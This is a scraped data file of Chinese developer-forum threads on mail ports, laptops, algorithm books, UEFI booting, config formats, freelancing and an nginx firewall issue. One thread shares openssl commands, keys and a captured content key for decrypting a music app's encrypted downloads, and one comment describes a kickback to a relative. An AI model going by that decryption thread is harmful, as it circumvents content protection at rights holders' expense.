"sendgrid sendcloud webapi \r", "\r", "试试网易的 993 端口。\r", "阿里云应该不限制，你看看防火墙怎么设置的", " 多谢~，我再试试", " 阿里云用 163 的 25 号端口可行, 可是阿里云上下载包太慢了，有没有什么解决方法？", "去年下半年新购的阿里云主机   25 已经被封了  \r", "你可以试试    telnet  ", "  25", " 你们阿里云上下载包很慢是怎么解决的，用代理吗？新手求带"]},
{"content": "", "reply": "29", "tittle": "有多少具有 4、5 年工作经验的程序员没有笔记本电脑的？", "comment": ["你想要什么答案", "工作五年多，已经把 13 年 MacBook 淘汰给老婆，把 15 年 MacBook 卖掉，上学时用的 07 年 XPS 被拆了， 11 年的 Qosmios 放一边落灰，偶尔拿出来回忆下。 办公室用 CanyonSkull 回家用一个淘宝上买的组装好的台式机", "敲键盘导致臂力日渐长进，目前喜欢扛着台式跑。", "我很长一段时间没电脑呢（服务器不算），只用公司的。", "去年买了个外星人台式机，前年的 mbp 吃灰了...", "台式爽", "坚定的台式党来报道。笔记本是什么东西？是用来吃灰的吗？", "笔记本+dock 再用，几乎从来就没拆过 dock ，这和台式机没区别了。", "mbp pro 放家里当电视\r", "公司用 mac mini 作为日常用机，屏幕要是还能更大就完美了", "一直用公司的，自己用台式。现在换地方了，公司的装了恶心的审计软件，台式的放在家里没搬过来，正在考虑购置一个笔记本中。", " 15 年的 mbp 不还是主力么,你都拿去积尘了啊", "前来报道。 一直工作就是用公司的台式机。。 没换过公司。。", " 我和你一样,现在回到家很少碰电脑了", "题目难道不应该是有多少 4,5 年工作经验的程序员买了房子吗?对于一个租房子的人来说台式就是麻烦...", "已经抛弃笔记本电脑。有条件一律用 PC ……\r", "CULV 的渣性能太捉急", "我就没有", "公司有台式, 回家有台式.\r", "其他时候不需要用电脑. 就不需要手提电脑.", "过年前刚买了个神船当便携式娱乐终端", "几年前我就是工作了 5 、 6 年，都没买笔记本，上班用公司电脑，下班回家用自己的破台式上上网什么的，后来认识了老婆用老婆的笔记本一起看 TVB 。\r", "直到接了个私活，老板送了台不用的外星人给我……", "在吃灰，偶尔用用，比如极少的去客户那", "下班回家玩玩 ps ，还碰电脑？", "两年程序员无发言权表示很伤心", "工作 14 年，至今没有笔记本可以吗？\r", "好吧，把时间拉回到十年前，那时候的我差不多可以回答这个问题。\r", "大约十年前左右，我办了一个 USB 的无线网卡（还是 2G 网络的，联通包年）。周围的同事几乎人手一台笔记本，所以，他们抢着用网线的时候（那会还没普及 wifi ）我随便找一个人接本子就可以了...", "外边有几台 vps  家里一个树莓派 一个 sony TV 。 手里一部手机。工作娱乐都是这些东西。", "手里一台华硕的 k550(14 年底入手,15 寸 1080 屏),加了内存,拆了光驱,加上 SSD,接上外屏,偶尔远程公司提供的台式机,家里一台台式机(麻蛋,刚出 6 代平台的时候,入的 4 代平台,结果导致升级不了,干几年算几年吧...)", "没有，一直用台式机。\r", "\r", "公司 MBP ，也外键显示器和键鼠。\r", "\r", "笔记本写代码和打游戏体验太差。", "虽然确实有一台自己的 MBP ，但是即使时间再长的程序猿没有笔记本也很正常呀，而且看岗位需求。\r", "上下班背着笔记本乱跑的要么运维要么是工作没几年的。我见过的老司机公司的电脑即使是笔记本，也不会往家带的。", "士兵 76 向你报道 ", " ", "只用台式的就没有出差的情况吗？"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>如题，哪些云服务商支持这两种类型网站，谢谢！</p>\n</div></div>"], "reply": "4", "tittle": "国内哪些云服务商支持电影类网站和淘宝客网站", "comment": ["你放什么内容，云服务器商不审查你吧，除非被别人发现举报哇", "就连虚拟主机都支持吧", "无论哪个云服务商都支持。\r", "\r", "电影类网站：\r", "1.允许在线播放电影，并且是你自己存储而非引用来自优酷、乐视、爱奇艺等。需要办理各种许可证才可以。\r", "2.不允许在线播放，只提供介绍、下载渠道等类似下载站的。随便都能做。记得网站一定要放个联系方式，方便如果发生侵权律师可以联系你让你删除相关信息。", "欢迎使用美团云： "]},
{"content": ["<div class=\"topic_content\">咨询一个问题：在国内某卫浴公司工作，一些来自电商平台的订单提供上门安装服务，公司开发了应用外包给当地师傅，但公司缺少互联网基因，程序员开发出来的应用很不人性化。客户信息与当地的安装师傅不能实时同步，需后台人员派单给师傅，师傅看到应用信息和再和客户预约好时间，再上传应用，因为程序的不完善带来很多不必要的效率闲置。我想询问开发如下产品“定位为即可商家发需求信息又可个人发需求信息提供各类家政服务的 APP ”，（目前只需商家版）师傅可通过认证获取资格，给附近客户提供需求上传完工图，客户给予评分。应用界面提供商家需求和个人需求。 信息显示根据定位提供文字显示也可打开地图显示。师傅去接商家一些贵重物品服务时，对应需要的服务水准。可逐步完善，应用能做到后台客户信息的文档上传自动处理,这款应用的有可行性吗？</div>"], "reply": "2", "tittle": "关于 oto 应用开发的想法求解答！非程序员", "comment": ["这微信服务号就解决问题了 都不用开发 app", "功能可行，执行效果看管理。\r", "另外楼主下次能否稍微排版一下，看得累"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>看到网上大家讨论的沸沸扬扬哒~~</p>\n<p>还说什么以后 RN 、 WEEX 、小程序都危险了，本猿正准备学小程序呢 (<em>ﾟДﾟ</em>)</p>\n<p>求 V 上的大大们解答一下</p>\n</div></div>"], "reply": "19", "tittle": "JSPatch 的事情挺说影响很大，是真的咩？", "comment": ["只是说不让热更新..又没说禁用 RN/Weex..", " pia pia 的，会不会以后也被封掉 ε(┬┬﹏┬┬)3", "你学框架还是学技术？", "小程序做增味剂即可，还是选个主流技术吧", "热更新还是可以用，只要不改变原来的功能，可以修复 Bug 一类的。", "都被带歪了 估计是不允许用热更新发布大功能吧", " 学技术，写出好的代码~~", " @", "  还以为是很严重的限制...", "这节奏带的， JSPatch 可以调用私有 api ，苹果向来是禁止的。\r", "微软的 codepush 啥事都没有怎么不说呢。", "被做原生开发的曲解了，特别是 IOS 。", " 莫非是一直想黑一下我们大前端，所以这次说得那么严重~~", " 习惯就好了，这次用私有 api 咋了，以前 360 还用企业证书做来电拦截呢\r", "那个英文第一段就说了，你的应用有在审核后改变表现的行为，这不就是用热更新大换血么\r", "以后的节奏就是小改动热更新，大改动还是重新审核一次", "别听风就是雨， ios 圈子现在很多公众号跟娱乐界一样。\r", "运行时只要是 js 还是可以热更新的。\r", "有闲工夫看那些垃圾信息不如去 Github 相关 issues 看看相关讨论： ", "\r", "\r", "请多点独立思考", " 这个听风就是雨也是前端搞出的新闻，热更新每次被提到的最大优点就是可以逃避苹果审核（当然你得说加速迭代上线速度）\r", "因为这事被警告怨不着苹果，现在的 bundle+framework 是在太强大，你今天下个淘宝，明天打开说不定就成京东了", " 并不是， JSPatch 能够触及 OC 代码，改变 native code 调用而不用审核。 code push 之类的改变不了这些，如果需要改变 native code 本身的部分 code push 是无能为力的。", " 对。我觉得 murmur 说的也是这个意思。所以一些人 rn 都没看过就各种恐慌啊，更可笑的是还有人做一堆表情包，看样子技术圈混了好对娱乐界的，出了新闻不知道思考光想着怎么追热点了。", "好对 -> 好多。", "小程序一天就能上手做的东西，又不要多少精力，不知道你在担心什么。", " ╥﹏╥..."]},
{"content": ["<div class=\"topic_content\">真是醉了</div>"], "reply": "101", "tittle": "终于知道大家为什么不喜欢用百度了,搜索一个问题 百度 10 个帖子都尼玛是复制粘贴的。。。", "comment": [" 搜狗被腾讯买了以后也染上了很多坏的东西，指望它们还不如指望必应。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>野生程序员一枚，硕士毕业后才学的前端，昨天去一网易美团级别的公司面高级前端，本来自己会写 4 、 5 种排序和搜索算法，没想到考官出了个类似搜索变体的算法题来考我，自己一下子蒙了，写了个复杂度最差的。</p>\n<p>已经决定在现在的公司再磨炼个一年左右，把计算机基础打好，从算法开始。市面上有两本 JS 方面的算法书，自己当时也是看的这个，不过感觉书的内容不深刻，决定看算法的经典书，不知道各位对上面提到的 2 本书推荐哪个。</p>\n</div></div>"], "reply": "56", "tittle": "《算法导论》还是《数据结构与算法分析： C 语言描述》", "comment": [" 基于 java 的。涵盖基本的数据结构和算法，讲的比较细， coursera 上面还有相应的课程.", "你有编程基础直接看算法导论就可以了", "哪个看得懂看哪个", "不过算法导论属于很多人都说看过， 其实没看过。。我感觉要实战的话， 没必要看算法导论  如果对计算机科学感兴趣，可以闲时看看，初学者看算法导论明显不合适。", "推荐刘汝佳的《算法竞赛入门经典》。真的一句废话都没有，我觉得应该是最功利的一种方式。", "都可以 都是好书 选哪本不重要 坚持看完才有用", "Robert Sedgewick 的<算法>明显更好入门。", " 不会 java 。。。暂时没太多时间学一门新语言", "千万别看算法导论和某些教科书，本来没多少的东西能把你绕晕。", " \r", " 决定先看 C 语言算法那本，穿插看看《算法导论》，真的不会 java ，不知道现在从 0 学 java 要不要花很多时间", " \r", " 那都大概看一下，选一本合适自己的了", "算法 Java 版 推荐", "入门的话 算法设计与分析基础 也不错", " 感谢，好多人推荐 Java 那本了，回头都找来看一看", " 从头学 java 要不了多长时间的，无非熟悉熟悉库函数", "强推 算法，值得拥有", "在看 算法第四版", " \r", "  感谢，这么多人推荐《算法》，有点想花一两周时间学学 java 入门的课了。", " 不想学 Java 的话可以读 Sedgewick 写的另外一本书《算法： C 语言实现》\r", "话说回来 算法第四版讲的其实都是数据结构", " +1 \r", "直接上这种书 没有废话", " 你推荐的这本书今天也找找看看，看看有没有葵花宝典的功效😁", "《数据额结构与算法分析： Java 语言描述版》和那本《算法 4 》我都看过，个人认为《数据额结构与算法分析： Java 语言描述版》这本更好，不太明白为什么有那么多人推荐那本 Java 红书，贼厚，而且个人觉得废话很多，感觉买的很不值。", "刚开始看的 数据结构与算法分析 , 感觉入门了 , 对算法有点熟悉了 . \r", "但是总觉得理解不够深入 , 又看了算法导论.", "算法导论", "算法导论真的看不下去,我买了一本,现在当字典来看....", "曾经在网上见过一个大神《算法导论》、《数据结构与算法分析—— C 语言描述》、还有严蔚敏的《数据结构》三本一起看，《算法导论》看部分章节，当字典辅助看。我也最近也在恶补， ", " \r", "\r", "那都不是事，我就是看到那本算法，但我自己不是用 JAVA （巨讨厌这门语言），而是用 C++写的\r", "\r", "这东西本来就和语言没啥关系。。。主要是思想", "我来推荐一本《算法设计》。\r", "\r", "《算法导论》是经典，不过认真读完的有多少？\r", "《算法》是神大神高德纳的徒弟的作品。\r", "《数据结构与算法分析： C 语言描述》如果没记错，作者是上面一位的学生？", "《算法的乐趣》会不会被人捧，《算法导论》倒是买了，无奈功底太差", "＜算法＞ java 版+1", "建议别看算法导论,全是公式,你看算法无非是为了面试,看下常用的一些算法,去 lintcode 上刷刷替就 ok 了", "数据结构与算法分析 java 语言描述和 上面推荐的算法 4 我都看了，对比还是算法四的内容好懂，所以我也比较推荐算法四", "个人觉得。这两本书都不是正解。\r", "你可以学习一些专门应对面试的算法。\r", "所以你可以先试试 LeetCode 刷两遍。", "《数据结构与算法分析》确实写得好，至于全不全不好说", "只看过《算法导论》，是好书，另一本只是翻了翻，算导是伪代码写的算法，写的伪代码很像 Python ，比另一本深入一些，但是厚度厚很多，看起来要花费的时间多一些（另一本薄很多啊），而且像是一本从入门到中级，从算法介绍到算法分析的 xx 大全或者 xx 宝典之类的书。", "虽然没看过 《数据结构与算法分析： C 语言描述》，但直觉告诉我两本书可能不是一个类型的。", "看过《数据结构与算法分析： C 语言描述》，这本书对算法学习和入门更有帮助。", "算法导论更像一本数学书，看了半本就看不下去了，又枯燥又难，看得又慢\r", "除非你真有时间，想了解各种数据结构、算法，以及他们之间的性能比较的话，算法导论倒是一本好书，甚至你会发现面试问的算法题可能只是这本书里习题的一个变种\r", "\r", "建议还是找本“功利”一点的书看吧", "后者,前者尼玛就是本理论书籍.\r", "\r", "而且数据结构看看书还是不错的.算法的话我感觉还是得敲代码.\r", "\r", "例如 leetcode?(是这么拼?)忘记了..", "野生的还是别直接看算法导论吧，这本书太多数学内容了，大部分都在分析算法复杂度", "都看过，推荐《数据结构， C 语言描述》", "算法导论不建议直接看书，有个 ppt ，是 MIT 讲课用的，先翻这个，不懂的再仔细看书。\r", "\r", "其实新手不推荐看算法导论，主要是压力太大了，那么厚一本，而且都是伪代码，看半天看不懂或者花了好长时间看懂了发现效率怎么这么低，很容易产生挫折感。\r", "\r", "建议还是看 java 或者 C++的算法书，最好是不太关注太底层的实现的，专注方法本身，算法跟数学一样，本来是很有意思的东西，但是弄不好就会产生挫折感，并不是你笨，而是没有找到合适的方法，适合自己的方法。\r", "\r", "所有与算法相关的，我都建议先看那种直接撸代码能跑出效果来的，然后自己慢慢调，这样会有持续的成就感，这点很重要，要有持续的激励。", " 感谢你详细的建议。你这么一说，想起了高中那会儿做算法题，根本不知道这东西和 cpu 、内存有关系，纯粹就是好玩，像脑筋急转弯那种感觉", " \r", " \r", " \r", " \r", " \r", " \r", " \r", "    感谢", "回复的人太多了，不一一感谢了。正在看那本竞赛书，如获至宝，没有废话，拿起键盘就是干", " 是的，我开始就是看的 C ，从链表开始就要应对底层的指针，我还是从嵌入式转过来的，当初微机原理，计算机架构， x86 汇编基础都还可以，看起来都觉得麻烦，主要是需要应付很多底层实现，但事实上算法应该更侧重于方法本身，他的确是需要一点底层的知识，但更重要的是方法，特别是到了后期学图论，运筹学，优化以及图形学，图像处理方面，其实跟底层没啥关系了，很多高阶算法都是在 Matlab 里面做的，只是在应用的时候，对性能有要求，才会用 C/C++去实现。\r", "\r", "其实算法就是算法，而算法的实现，有 Matlab(高阶抽象语言，最接近人类语言)实现， Java/C++/C 实现，以及 FPGA/VHDL 实现，理论上同一个算法， Matlab 实现性能最低，但是最方便； FPGA 性能最高，但实现难度最大。", "  到底是哪本竞赛书？链接发一下？具体英文名称", "想知道硕士读的啥…", " 回复里有", " 非计算机专业", "两本都看过。《算法导论》采用伪代码，更偏向理论，更深入。《数据结构与算法分析》是 CS@ZJU 数据结构课教材，算法分析部分不如前者。", "CLRS 好啊 知其所以然", "也可以考虑刷刷题，比如 codewars ， leetcode 这样的", "算法导论。。。 这部太过教科书了！写得很晦涩，很容易看崩溃。推荐《算法》第四版 红色封面这本，不过是 java 语言写，但都是一些基础语法，有编程基础的不难理解。", "这两本都不错", "不明白那么多人推荐\r", "算法第四版\r", "真的都是认真看过的吗？\r", "\r", "还仅仅是因为图多名字拽\r", "\r", "\r", "\r", "不做推荐\r", "自己哪个能看的进去就看哪个"]},
{"content": ["<div class=\"topic_content\">因为越来越多的网站端就都做了检查限制强制访问移动版面了，</div>"], "reply": "7", "tittle": "感觉现在多数的移动端浏览器中的\"请求桌面网站\"的功能已经是比较鸡肋的功能了", "comment": ["V2EX 就没有吧，之前收藏入口还没做的时候，就是请求了桌面版才进去的。\r", "我觉得请求桌面版这个功能还蛮好的，蛋疼的是越来越多的网站是根据屏幕尺寸来做适配，响应式排版，请求了桌面版也没用", " 对就像中国移动 10086.cn 这样的，请求了也没用，真是很让人那个的", "我这 chrome 56 的请求桌面网站已经可以无视响应式排版\r", "\r", "因为越来越多的网站端就都做了检查限制强制访问移动版面了\r", "> 感觉只是跳转后的那个页面没有做检测是不是电脑，跳回电脑版", " “> 感觉只是跳转后的那个页面没有做检测是不是电脑，跳回电脑版”我也是这个感觉", " 这个也不行 ios 下 chrome safari 都请不到", "就当个调试功能吧，没有了平时没感觉，真到使用的时候还是比较需要的。", "我还是很少遇到这种网站"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>通过正常流程安装了 Arch</p>\n<p>/dev/sda1 作为 ESP 挂载在 /boot\n，\n/boot/EFI/grub/grub.efi 存在</p>\n<p>启动管理方式为 grub + efibootmgr</p>\n<p>每次关机之后，都必须手动选择 boot from file,然后选择 grub.efi, 无法自动加载 Arch 的引导</p>\n<p>请问这种情况可能是哪里出了问题，应该怎么解决</p>\n</div></div>"], "reply": "19", "tittle": "Virtual Box(guest os Arch) UEFI 不引导，求助", "comment": ["/boot/EFI/ 必须是 FAT （或者叫 EFI ）格式的分区", " /boot/EFI 必须是一个分区么？", " 是不是应该直接把 sda1 挂载到 /boot/EFI 而不是挂载到 /boot  ？", "![]( ", ")", "<img src=\"http://p1.bqimg.com/567571/7031e2eda763f710.png\" />", "使用 UEFI 磁盘必须整个用 gpt 分区格式。建立一个 fat 格式的分区， label 是 EFI ，加可引导标识 bootable 。把编译好的 efi 文件放到分区的根目录就好了。如果有配置文件，放到编译 efi 文件时设定的目录，一般跟 efi 文件放一起，或者放 /grub 目录下（ EFI 的分区）。内核命令行设定加载 root 分区。", "/boot/EFI/boot/bootx64.efi 有吗？\r", "\r", "bios 是先找这个文件。。。", "grub 按照 arch wiki 上的 uefi 的命令装，我实体机装过。没问题。\r", "grub 安装的时候有参数指定复制的引导文件类型，和目标位置。", "/boot 如果是独立 FAT 分区也可以；最低要求是 /boot/EFI/ 是独立分区\r", "\r", "centos 安装程序如果检测到不合适的情况会提示；其它发行版不了解是否会", " 照着这个指定的 --efi-directory=/boot\r", "\r", "所以需要把 EFI 格式的分区挂载到 /boot/EFI 么？\r", "\r", "还是挂载到 /boot", " 我的做法是，/boot 是独立分区，不清楚 efibootmgr 生成的 efi 文件应该指定在哪里才能在开机的时候读取到呢？", " #11 \r", "\r", "# grub-install --target=x86_64-efi --efi-directory=esp_mount --bootloader-id=grub\r", "UEFI firmware workaround 《《《——————《《《——————\r", "# mkdir esp/EFI/boot\r", "# cp esp/EFI/grub_uefi/grubx64.efi esp/EFI/boot/bootx64.efi", " 似乎并没有解决问题。\r", "我还是先去仔细了解一下原理再去解决这个问题吧", "/boot/EFI/boot/bootx64.efi 　 vbox 识别的引导路径是这个，检查下你的文件名还有路径", " 不止是独立的问题，关键是要 FAT 格式，才能被 UEFI 识别", " \r", " \r", "路径和格式都是这样的\r", "\r", "reboot 之后可以正确引导，关闭窗口再打开就无法进入了，比如手动选择", " 贴下 sda1 的格式类型,还有 bootx64.efi 的文件信息看看", "![]( ", ")"]},
{"content": ["<div class=\"topic_content\">存放一些配置信息，不知道该怎么选结构啊。\r<br>有没有前辈来告知下 3 种的对比，最好有使用场景举例。</div>"], "reply": "17", "tittle": "请教 ini json xml 三种结构的使用场景", "comment": ["yaml", "toml", "请教需要频繁读写的选什么合适， ini 的经常读写，如果写冲突就会把所有内容清空， 0kb\r", "后台微软不是弄了注册表吗，但是注册表 pyrhon 在 64 ！ 32 位系统下读取不一样", " @", " 额，两位的回答请可以不要歪楼么= =", "配置信息就用 ini 吧，或者 yaml ，都挺好的", "不过 sb 和 vs code 用的都是 JSON ，估计也有他们的考虑", "XML 就算了吧，不好使", "话说不同语言有不同的配置文件传统吧，如果你用的语言比较动态，直接用它本身做配置也可以（比如 json ，直接可以解析成 js 对象）", "应该就是传统问题 如 #6 所述，不过目前的新型应用基本都用 json", "toml +1", "ini 只做配置存储，直观。\r", "XML 可以结构化存储数据，也可以存配置，但是如果有手动编辑这个文件的场景，对开发者会比较不直观。\r", "ini 和 XML 一般是因为历史原因才在一些项目中仍然被使用，现在新开项目的话，都用 JSON 即可。", "互联网应用偏爱 json\r", "企业开发喜欢 xml\r", "很老的 app 才会用 ini", "b 站的弹幕信息貌似就是 xml 的", "toml +1", "ini 配置多见于 Windows 应用程序\r", "\r", "xml 多见于 Maven 项目配置文件和部分 API 接口\r", "\r", "目前 json 是较为常见且流行的结构，现在的 API 接口都在用它\r", "\r", "JSON IS GOD, XML IS DUST\r", "\r", "当然还有 yaml 格式也别忘了", "如果你希望对人类最友好，那么选择 ini\r", "xml 太啰嗦语法也太严格\r", "json 的语法一样太严格，尼玛连个注释都不可以有\r", "如果需要结构化，首选是 yaml ，可以作为 json 的完美替代，也对人类友好", "我喜欢 json ，互联网项目基本都是这个。但是如果是企业技术栈比较求稳的还是 XML 比较多\r", "似乎微软偏爱 XML", "需要人写的 ini 这个语法最不复杂\r", "需要人读的 json\r", "不需要人读写的 xml 或其他", " 最后两句反了了吧。\r", "一般 INI 做配置化使用\r", "JSON 做传输或者结构和存储\r", "XML 一般用在可读性强的场合"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>坐标帝都，三年 php 开发经验，不晓得怎么接到私活，最好是相对稳定的那种，每个月都有创收。</p>\n</div></div>"], "reply": "44", "tittle": "作为程序员，大家是怎么接到私活的？", "comment": ["朋友、朋友的朋友、朋友的朋友的朋友……总之要告诉周围所有的人，你做什么的，你擅长做什么的。", "让尽可能多的人知道你，也知道你会什么。", "朋友，朋友的朋友。\r", "赞同一楼，一定要让周围的人知道  你能做什么 你会做什么 而且不仅仅是会  是特别擅长", "有木有和外包公司长期合作过的？", "对的  一传十 十传百 百传千。然后就是你挑项目了。", "对的  一传十 十传百 百传千。然后就是你挑项目了。", "对的  一传十 十传百 百传千。然后就是你就被公司开除了\r", "\r", "我觉得自己的业余时间有限，可以拿来运动、陪家人、参与开源项目。做外包是一种非常廉价的收入方式。\r", "我有朋友开外包公司，迄今为止我有 10 多个找我外包推给我朋友，没一个谈成了的，不是我朋友收费高，而且本身来找个人外包的人期待的就是廉价的劳动力。", " 哥们，你朋友那边需要兼职吗？给介绍介绍，我知道外包就是廉价的劳动力，但是最近还房贷压力大，还有奶粉钱，只能拼命干活喽", "认识的人几乎不是这个领域的，况且也不怎么和他们交流的话，怎么才能找到私活？网上类似猪八戒的网站是不是很不靠谱的？", " 猪八戒不靠谱，码市 实现网这些不固定，就会不多", "多跟朋友吹牛。。", "介绍的多，网上也可以合作", " 网上？推荐几个平台", "懂英文又有些成果，可以去 upwork", "猪八戒之类的就不用看了，没意思", "A5.CN", "https ：//guru.com 也可以尝试，有机会的我们可以合作，微信： byronex", "  这话说的没毛病  这种朋友介绍的活  10 个能有 1 个成的就不错了。", "同意 @", " 所说\r", "接私活除非是一些有实力的甲方，比如说你七大姑八大姨在 zf 机关有些关系，要做个网站、 app 、微信公号之类的，否则还是把时间投入到技术上，这样第二年你上涨的工资绝对比你接私活来的多。\r", "\r", "曾经接过一个项目，报价 50w ，果断辞职干了半年，当然了，甲方领导是我亲戚，给了 10w 回扣给他", "freelancer", "我给你一个建议，接不靠谱的私活还不如做一个自己的小项目，做好了能赚钱最好，不赚钱也能开源了帮助新手学习，还可以当做项目经验写进简历里，啥都不耽误。", "程序员一定要多交朋友，说不定朋友的朋友有事就找你，我做的私活好多都是这样来的", "这个时候又要亮出接收录私活的一个导航了\r", "对的  对的 一传十 十传百 百传千 百传万", " 偶遇私活大神", "工作不饱和？还有时间接私活？", " 突然发先 广+兼=廉", "求设计私活！", "口口相传 其他行业的朋友其实有很多需求的...就看自己能不能把握了", " 看了半天 [口口相传] 还以为前两个字乱码了，我可能是加班过劳了[(ノへ￣、)捂脸]", " 没错 其实你看到的其实是烫烫烫烫烫", "全靠朋友捧场\r", "同学、朋友、同事、前老板\r", "同学的同学、同学的朋友、同学的同事、同学的老板\r", "朋友的同事、朋友的老板\r", "旧同事的新老板\r", "我的前前老板", "说真的私活的效益不入提高技术后换工作的效益，而且私活对你个人的时间占用特别厉害，得不偿失", "php 可以写网站吗", "每年都被骚扰十来次，偶尔做一两个，其他的都拒绝，不是很缺钱最好不要做，心累，认认真真做些东西扔在那不动钱来得还快", "如果是朋友介绍的，要不要给介绍费？一般都是多少？", "外包真的是……本来谈的好好的都已经做完了……\r", "\r", "客户突然灵光一现：哎呀感觉这样设计更好一些\r", "\r", "TM 的把我们交付的产品当原型使啊（掀桌\r", "\r", "给钱还少……至今还没有谈改需求加钱的事……", "有想着的联系我...", "闷声发大财", " 亲戚还需要给回扣？假亲戚。。。", "你们好闲……", "小王啊 我这有台打印机坏了 你帮我来看看", "口碑", " 这叫礼尚往来"]},
{"content": ["<div class=\"topic_content\">文件包的 VASR02032853.properties 文件内有一个 96 位 16 进制的 key ，这个 key 的文件信息是否足够解密这些切片文件呢？\r<br>key 的内容如下：\r<br>#keys\r<br>#Thu Mar 02 22:12:41 GMT+08:00 2017\r<br>\r<br>25=C4ADEF542005E68022B4BD1827291177EA10CF028C15D6497CD4647728F33CD0191EEF9F6924AF0A4596ACA323A73E6F\r<br>\r<br>\r<br>\r<br>文件在这里： <a target=\"_blank\" href=\"http://pan.baidu.com/s/1cw3P2Q\" rel=\"nofollow\">http://pan.baidu.com/s/1cw3P2Q</a>\r<br>\r<br>因为之前解过的文件 AES-128-CBC 的 key 是 32 位的，有 key 和 iv 就可以使用 openssl 解出来，但遇上这个 96 位的 key 就不懂了。\r<br>谢谢！</div>"], "reply": "14", "tittle": "有个 AES-128-cbc 加密的文件，内有一个 key 文件，不知能否解出来？谢谢。", "comment": ["AES-128   对应的 KEY 是 16 位\r", "AES-192  对应的 KEY 是 24 位\r", "AES-256  对应的 KEY 是 32 位\r", "\r", "CBC 模式下 是需要 IV 的", "您好，可以请教您一个问题吗？我看到您在另一个帖子里说可以 hexdump 工具 dump 出 key ，是指查看这个 key 文件的十六进制的数值吗？", "如果破解者有你的程序就比较容易了，即解密“ AES-128-cbc 加密的文件”的程序。只发这个“ AES-128-cbc 加密的文件” 文件是很难破解的。", " ,是的，通过 hexdump 查看 key 文件的 16 进制数值。(hexdump -v -e '16/1 \"%02x\"' key)\r", "\r", "\r", " 是的，我也在想是不是文件夹的信息不足够解密。可能有部份加密的信息是在客户端里。\r", "\r", "\r", "\r", "app 在这里： ", "\r", "（安桌版本，需要脸书帐号登录）\r", "\r", "是一个音乐 app ，下载无损音乐后会在 content 的文件夹生成对应每只歌曲的文件夹。我目的是想把内容解密出来拷到其他播放器听。", " 我看了您之前的 VAWM02024516-HD.key ， hexdump 显示是一个 16 个字节的密钥，我下载下来用您说的方法测试是可以解密的。可是我现在手里有一个 m3u8 ，加密方式是 AES-128 ，下载的 key 用 hexdump 显示是一个 32 个字节的密钥，不知道是为什么了...", " \r", "你的 m3u8 里的 “#EXT-X-KEY ”这一行是不是显示\"METHOD=AES-128\"? 如果 key 是 32 位的有可能是\"AES-256\"加密的。", " 是写的 AES-128 ，但是 key 是 32 位，所以感觉很奇怪", "今天用 fiddler 抓包，发现了一个 32 位的 contentkey ，但仍是解不开。不知这个 content key 的作用。\r", "\r", "VASR02032852 的 contenkey\r", "\",\"contentKey\":\"06AC04970F0404443FFB9F3C41606338", " 你好，我在你之前的回复看到你好像解析成功了，我解析的时候 openssl 总是显示 hex string is too long\r", "invalid hex iv value ，这是我的解析代码\r", "C:\\OpenSSL-Win32\\bin>openssl aes-128-cbc -d -in new_0.ts -out media_decryptd_0.ts \r", "-nosalt -iv 0x00000000000000000000000000000001 -K e8599247ff3327aced6402ddf78a577e ，\r", " 能不能说下你 oepnssl 具体是怎么配置的，我用的是 openssl win32 ，官网还有个 openssl-1.1.0e ，是要用哪一个", "另外你之前的那个音乐的其实直接用 potplayer 直接就能自动解析播放", "方便的话能不能加下 QQ ，交流更迅速\r", "你解密视频的 ts 文件是怎么批量解密的。", ", iv 值是 32 位的，开头两位“ 0X ”不要。\r", "openssl aes-128-cbc -d -in new_0.ts -out media_decryptd_0.ts \r", "-nosalt -iv 00000000000000000000000000000001 -K e8599247ff3327aced6402ddf78a577e\r", "\r", "\r", "近期比较忙，有空再折腾这个东西，不过我估计有些流媒体有 DRM 保护，基本是没办法解出来的。", "我的 ok 了， moov 网页版你试试看，老方法成功破解"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>真是日了狗了，之前 nginx 也不是没有配过 ssl 证书，这次说什么也不行， nginx 却不报错</p>\n<p>使用 <a href=\"http://acme.sh\" rel=\"nofollow\">acme.sh</a> 签发的 let's encrypted 证书， dns 验证方式</p>\n<pre><code>server {\n\tlisten       443 ssl;\n\tserver_name  mydomain;\n\t\n\tssl_certificate \t/etc/nginx/ssl/fullchain.cer;\n\tssl_certificate_key\t/etc/nginx/ssl/mydomain.key;\n</code></pre>\n<h1>ssl_ciphers EECDH+CHACHA20:EECDH+CHACHA20-draft:EECDH+ECDSA+AES128:EECDH+aRSA+AES128:RSA+AES128:EECDH+ECDSA+AES256:EECDH+aRSA+AES256:RSA+AES256:EECDH+ECDSA+3DES:EECDH+aRSA+3DES:RSA+3DES:!MD5;</h1>\n<pre><code>\tssl_prefer_server_ciphers   on;\n\n\troot           /wordpress;\n\tindex index.html;\n}\n</code></pre>\n<p>这样的配置文件有什么错吗？</p>\n<p>一整晚也没发现问题，请教各位了</p>\n</div></div>"], "reply": "12", "tittle": "诡异的问题， nginx 配 ssl 证书后 443 端口打不开网站，却不报错", "comment": ["access 和 error log 打开看看呢", "error log 已经调成 info 级别，没有任何错误输出", "首先，你没配置 PHP 部分和 WordPress 伪静态部分\r", "其次，把 index index.html;改成 index index.php;", "浏览器有什么提示？", " index.html 是我用来测试的单网页，为了去掉 php 方面因素", " \r", "无法访问此网站\r", "\r", "响应时间过长。\r", "\r", "请试试以下办法：\r", "检查网络连接\r", "检查代理服务器和防火墙\r", "运行 Windows 网络诊断\r", "检查网络连接。\r", "请检查电缆情况，然后重启路由器、调制解调器或您正在使用的其他网络设备。", "错误信息都没给，怎么搞？猜测是防火墙问题。", "在服务器检查 443 端口有无打开， access 有无浏览器连接纪录（按你的描述，应该没有）", "telnet 443 看看端口呗", " 防火墙", " \r", " \r", " \r", " \r", "实在抱歉各位，我脑子秀逗了没开防火墙，耽误大家的时间实在对不起，给大家道个歉", " 从外面看了标题就想到这可能，因为之前也踩过这个坑，调试了半天，发现云上的端口没开，服务器上啥提示也没有。\r", "点进来发现还真是的"]},
